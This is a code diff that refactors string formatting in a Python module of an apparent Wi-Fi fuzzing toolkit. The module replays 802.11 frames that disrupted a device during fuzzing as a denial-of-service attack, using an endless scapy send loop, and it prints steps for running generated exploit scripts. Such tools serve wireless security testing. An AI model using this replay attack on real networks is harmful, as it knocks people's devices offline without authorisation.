@@ -73,11 +73,7 @@ def print_exploit(frame, frame_type):
         )
         subtype = int(int.from_bytes(frame[8:9], "big") / 16)
         print(
-            "Replace "
-            + bcolors.OKBLUE
-            + "{SUBTYPE} "
-            + bcolors.ENDC
-            + f"with {subtype}"
+            f"Replace {bcolors.OKBLUE}" + "{SUBTYPE} " f"{bcolors.ENDC} with {subtype}"
         )
         print("\nAlso do the replacements:")
         print(
@@ -102,7 +98,8 @@ def print_exploit(frame, frame_type):
             + " with your WNIC attacking interface"
         )
         print(
-            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_mngmt.py{bcolors.ENDC}"
+            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}"
+            f"sudo python3 exploit_mngmt.py{bcolors.ENDC}"
         )
         print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
         input(
@@ -125,11 +122,7 @@ def print_exploit(frame, frame_type):
             + bcolors.ENDC
         )
         print(
-            "Replace "
-            + bcolors.OKBLUE
-            + "{SUBTYPE} "
-            + bcolors.ENDC
-            + f"with {subtype}"
+            f"Replace {bcolors.OKBLUE}" + "{SUBTYPE} " f"{bcolors.ENDC} with {subtype}"
         )
         print(
             "Replace "
@@ -205,24 +198,20 @@ def print_exploit(frame, frame_type):
         )
         print("\nAlso do the replacements:")
         print(
-            bcolors.OKBLUE
-            + "{DESTINATION_MAC}"
-            + bcolors.ENDC
-            + " = targeted_AP/targeted_STA, "
-            + bcolors.OKBLUE
-            + "{SOURCE_MAC}"
-            + bcolors.ENDC
-            + " = targeted_AP/targeted_STA"
+            f"{bcolors.OKBLUE}"
+            "{DESTINATION_MAC}"
+            f"{bcolors.ENDC} = targeted_AP/targeted_STA, {bcolors.OKBLUE}"
+            "{SOURCE_MAC}"
+            f"{bcolors.ENDC} = targeted_AP/targeted_STA"
         )
         print(
-            "\nFinally, replace"
-            + bcolors.OKBLUE
-            + " {ATT_INTERFACE}"
-            + bcolors.ENDC
-            + " with your WNIC attacking interface"
+            f"\nFinally, replace{bcolors.OKBLUE}"
+            " {ATT_INTERFACE}"
+            f"{bcolors.ENDC} with your WNIC attacking interface"
         )
         print(
-            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_data.py{bcolors.ENDC}"
+            f"\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}"
+            f"sudo python3 exploit_data.py{bcolors.ENDC}"
         )
         print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
         input(
@@ -239,8 +228,9 @@ def send_frames(frames_list, mode, frame_type):
                 input("\nType the number of frames to transmit per seed: ")
             )
         except:
-            print("\n" + bcolors.FAIL + "Only integer inputs accepted" + bcolors.ENDC)
+            print(f"\n{bcolors.FAIL}Only integer inputs accepted{bcolors.ENDC}")
             sys.exit(0)
+
         for frame in frames_list:
             print(f"Sending {num_of_frames} frames of the {counter + 1} seed..")
             for _ in range(0, num_of_frames):
@@ -259,23 +249,20 @@ def send_frames(frames_list, mode, frame_type):
                     break
             counter += 1
         print(
-            "\n"
-            + bcolors.FAIL
-            + "No more seeds found in the fuzzer’s log files"
-            + bcolors.ENDC
+            f"\n{bcolors.FAIL}No more seeds found in the fuzzer's log files{bcolors.ENDC}"
         )
         print("Exiting attack!!")
         sys.exit(0)
     elif mode == 2:
         print("\n- - - - - - - - - - - - - - - - - - - - - - - \n")
-        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
-        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
+        print(f"{bcolors.OKGREEN}Launching the attack....{bcolors.ENDC}")
+        print(f"{bcolors.OKGREEN}Stop the attack with Ctrl+C{bcolors.ENDC}")
         print("\n- - - - - - - - - - - - - - - - - - - - - - - \n")
         while True:
             for frame in frames_list:
                 scapy.all.sendp(frame, count=128, iface=att_interface, verbose=0)
     else:
-        print(bcolors.FAIL + "\nNo such choice :(" + bcolors.ENDC)
+        print(f"{bcolors.FAIL}\nNo such choice :({bcolors.ENDC}")
         sys.exit(0)
 
 
@@ -284,7 +271,10 @@ print(
     "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n"
 )
 print(
-    "\t\tThis module launches a DoS attack based on the data (log files) collected from the fuzzing process.\n\t\tIt can only be performed against the same AP and STA used during the fuzzing process.\n\t\tNamely, the frames that caused any kind of problematic behavior during the fuzzing are being\n\t\ttransmitted in a way decided by the below options.\n\n"
+    "\t\tThis module launches a DoS attack based on the data (log files) collected from the fuzzing process.\n"
+    "\t\tIt can only be performed against the same AP and STA used during the fuzzing process.\n"
+    "\t\tNamely, the frames that caused any kind of problematic behavior during the fuzzing are being\n"
+    "\t\ttransmitted in a way decided by the below options.\n\n"
 )
 print(
     "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n"
@@ -292,15 +282,14 @@ print(
 print("1) Frames detected at the moment of STA connectivity disruption, one-by-one")
 print(
     "2) Sequence of frames till the moment a disruption was detected "
-    + bcolors.WARNING
-    + "(BETA)"
-    + bcolors.ENDC
+    f"{bcolors.WARNING}(BETA){bcolors.ENDC}"
 )
 try:
     choice = int(input("\nSelect the type of frames you wish to attack with: "))
 except:
-    print("\n" + bcolors.FAIL + "Only integer inputs accepted" + bcolors.ENDC)
+    print(f"\n{bcolors.FAIL}Only integer inputs accepted{bcolors.ENDC}")
     sys.exit(0)
+
 subprocess.call(["clear"], shell=True)
 print(dos_attack)
 print(
@@ -308,12 +297,13 @@ print(
 )
 print("1) Management Frames")
 print("2) Control Frames")
-print("3) Data Frames " + bcolors.WARNING + "(BETA)" + bcolors.ENDC)
+print(f"3) Data Frames {bcolors.WARNING}(BETA){bcolors.ENDC}")
 try:
     choice1 = int(input("Select the type of the frames: "))
 except:
-    print("\n" + bcolors.FAIL + "Only integer inputs accepted" + bcolors.ENDC)
+    print(f"\n{bcolors.FAIL}Only integer inputs accepted{bcolors.ENDC}")
     sys.exit(0)
+
 current_dir = os.getcwd()
 if choice1 == 1:
     file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
@@ -325,7 +315,7 @@ elif choice1 == 3:
     file_list = os.listdir(current_dir + "/Logs/fuzz_data_frames")
     frames_dir = "/Logs/fuzz_data_frames/"
 else:
-    print(bcolors.FAIL + "\nNo such choice :(" + bcolors.ENDC)
+    print(f"{bcolors.FAIL}\nNo such choice :({bcolors.ENDC}")
     sys.exit(0)
 
 init_att = DoS_attack_init(file_list, choice, frames_dir)
